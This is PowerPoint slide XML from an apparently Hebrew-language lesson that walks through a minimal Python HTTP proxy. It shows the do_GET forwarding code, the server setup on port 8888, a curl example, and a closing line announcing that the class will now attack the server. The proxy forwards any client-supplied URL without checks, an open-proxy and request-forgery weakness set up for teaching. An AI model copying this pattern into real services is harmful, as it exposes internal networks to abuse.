              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>______________________________________________________________________________</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>        # Forward the request to the destination server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>        response = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>requests.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>self.path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>_______________________________________________________________________________ </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>        # Return the response from the destination server to the client</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>self.send_response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>response.status_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>        for key, value in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>response.headers.items</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>():</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>self.send_header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>(key, value)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>self.end_headers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>self.wfile.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>response.content</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="57477281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A4AEE6F-50DB-4E6B-9030-90BCAA614F0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1639956" y="642594"/>
            <a:ext cx="9485243"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7AAF72CF-4E9E-4A60-B0D3-730E085488AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסבר הקוד: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>פונקציית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>do_GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כאשר מתקבלת בקשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> GET, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד מדפיס את הנתיב</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>path </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הבקשה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד שולח את הבקשה לשרת היעד בעזרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>requests.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>self.path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ומקבל את התשובה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>do_GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(self):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        # Print the request path</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        print(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>f"Handling</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> GET request for {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>self.path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>}")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> # Forward the request to the destination server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        response </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>requests.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>self.path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="425029166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2AAAD05-A1B2-43DE-B4DC-40E62E81B87D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1633331" y="632655"/>
            <a:ext cx="10058400"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CC3644FC-54C2-4DDB-9728-7C831C5C66DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103120"/>
            <a:ext cx="10058400" cy="4347376"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסבר הקוד: לאחר קבלת התשובה, הפונקציה מחזירה את קוד התשובה והכותרות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>headers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ללקוח. לבסוף, התוכן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> body</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של התשובה נכתב חזרה ללקוח באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>wfile.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>response.content</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> # Return the response from the destination server to the client</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>self.send_response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>response.status_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        for key, value in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>response.headers.items</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>():</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>self.send_header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(key, value)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>self.end_headers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>self.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>wfile.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>response.content</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="350823398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4A5C6C5-1B1E-47F4-AA1F-4EF6D6986353}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1620078" y="642594"/>
            <a:ext cx="9505122"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DDABA249-CBAC-47E7-B6F8-C0BD1B2E6960}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103119"/>
            <a:ext cx="10058400" cy="4446767"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הגדרת והפעלת השרת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תחילה מגדירים את הפורט והמטפל: הפורט שבו השרת יאזין נקבע ל-8888.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשתנה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Handler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מוגדר כ- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כלומר כל בקשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תטופל על ידי המחלקה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Proxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>socketserver.TCPServer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> : וצר שרת שמאזין לכל הכתובות המקומיות בפורט 8888 ומשתמש ב- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לטיפול בבקשות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפקודה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>httpd.serve_forever</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מפעילה את השרת וממתינה לבקשות נכנסות.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t># Set up the server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PORT = 8888</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Handler = Proxy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>socketserver.TCPServer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(("", PORT), Handler) as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>httpd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    print(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>f"Serving</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> at port {PORT}")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>httpd.serve_forever</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="278366775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F549B66-4A2B-408A-A05D-1AEA40A48935}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1520686" y="642594"/>
            <a:ext cx="9604513"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E374F165-CED6-4BEE-9AF8-72C3DAEC88A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אז לבסוף מה בעצם עשינו?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגדרנו שרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Python</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יצרנו שרת שמאזין לבקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מהלקוחות (כמו דפדפנים או כלי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אחרים ומטפל בהן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הפנינו את הבקשות לשרת היעד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כשהשרת שלנו מקבל בקשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>,HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא מעביר אותה לשרת היעד המתאים ומקבל את התשובה ממנו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>החזרנו את התשובות ללקוח</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: השרת שלנו מחזיר את התשובות שהתקבלו משרת היעד ללקוח המקורי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3969374235"/>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ACE01C-9A88-45D0-858B-5E36ABA3FE24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1669774" y="642594"/>
            <a:ext cx="9455426" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - שאלה רצינית על </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>roxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4B2D9A46-5A0C-4310-9B23-CE3DA1243A69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה מעשית: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שמפעילים את השרת ושולחים בקשה דרך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl -x http://localhost:8888 http://example.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בקשה זו עושה את הצעדים הבאים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>השרת שלנו מקבל את הבקשה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מאזין לבקשה לטעון את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://example.com</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מעביר את הבקשה לשרת היעד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שולח את הבקשה לשרת היעד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>example.com</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מקבל את התשובה מהשרת היעד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שרת היעד מחזיר את התשובה (למשל, תוכן עמוד האינטרנט).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מחזיר את התשובה ללקוח</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מחזיר את התשובה שקיבל משרת היעד ללקוח </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> במקרה זה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>* אז אחר שבנינו שרת בוא וננסה להתקיף אותו!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
